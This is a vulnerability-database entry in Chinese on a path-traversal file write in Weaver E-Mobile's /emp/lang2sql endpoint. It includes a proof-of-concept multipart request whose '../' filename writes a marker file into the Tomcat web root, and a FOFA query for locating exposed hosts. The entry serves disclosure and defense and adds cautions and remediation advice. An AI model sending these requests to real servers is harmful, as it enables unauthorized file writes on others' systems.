---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/%E6%B3%9B%E5%BE%AE%20e-Mobile-lang2sql%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.yaml"
title: "泛微e-mobile lang2sql路径穿越上传/任意文件写入"
product: "泛微e-mobile"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；appsvr/tomcat/webapps/ROOT布局及写权限"
prerequisites: "实际认证未列，样本无cookie"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Mobile%20lang2sql%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-EMobile\""
id: "vw-dba403540129fa22bc20bd39"
entity_id: "ve-dba403540129fa22bc20bd39"
schema_version: "1"
---

# 泛微e-mobile lang2sql路径穿越上传/任意文件写入

## 条目说明

- 对象与具体问题：泛微e-mobile；lang2sql路径穿越上传/任意文件写入
- 版本、配置及部署条件：版本未知；appsvr/tomcat/webapps/ROOT布局及写权限
- 认证与权限前提：实际认证未列，样本无cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 完整文本上传回读、限定目录布局，不把txt回读泛化JSP执行
- 保留查询参数、file字段、清理和旧文件误报说明
- 可规范根因为路径穿越写入；version/cve未知需结构化

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

泛微 E-Mobile 的语言处理接口 `/emp/lang2sql` 接收上传文件。公开 PoC 在上传文件名中使用相对路径，将文本写入 Tomcat Web 根目录后回读，用于验证文件保存路径限制失效。

### 影响范围与前提

产品：泛微 E-Mobile；具体受影响版本与补丁范围未知。公开路径假设服务器使用所示 `appsvr/tomcat/webapps/ROOT` 目录布局且具有写入权限；不能据此外推到所有部署。

### 公开验证资料

请求及文本标记取自上游，包含不可省略的查询参数与 `file` 文件字段：

```http
POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
Host: oa.example.com
Content-Type: multipart/form-data; boundary=VulWikiBoundary

--VulWikiBoundary
Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/tmslpwlw.txt"

uweesjfp
--VulWikiBoundary--
```

回读：

```http
GET /tmslpwlw.txt HTTP/1.1
Host: oa.example.com
```

这组请求会写入文件。隔离验证需先排除同名旧文件，再确认返回本次文本 `uweesjfp` 并清理产物。文本成功回读只证明对应位置的文件写入与访问，不能自动证明 JSP 解析或服务器控制权限。

### 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

### 参考来源

- [公开资料 1](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/%E6%B3%9B%E5%BE%AE%20e-Mobile-lang2sql%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
